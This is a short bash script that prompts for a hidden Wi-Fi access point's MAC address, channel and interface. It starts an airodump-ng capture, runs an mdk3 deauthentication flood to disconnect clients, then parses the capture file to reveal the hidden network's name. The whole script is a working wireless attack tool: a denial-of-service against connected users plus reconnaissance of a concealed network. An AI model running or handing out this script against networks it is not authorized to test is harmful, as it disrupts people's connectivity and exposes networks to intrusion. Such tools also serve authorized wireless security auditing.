echo "Please enter the following information."
echo ""
read -p "Mac Address of the hidden AP: " mac
read -p "Channel number: " channel
read -p "Network interface: " interface
read -p "Output file: " filename

xterm -e "airodump-ng --bssid $mac -c $channel -w $filename $interface & wait"&
echo "Starting the deauth attack with mdk3..."
mdk3 $interface d&
sleep 10
killall -e "mdk3"

echo "Waiting to record ProbeResp packets..."
while true; do
	CHECKOUT=$(cat $filename-*.csv | grep $mac | awk -F "," '{if ($3 != "")print $3}' | head -n3)
	echo $CHECKOUT
	read -p "Got it?" flag
	case $flag in
		yes) break
	esac
	sleep 5
done
killall -e "airodump-ng"
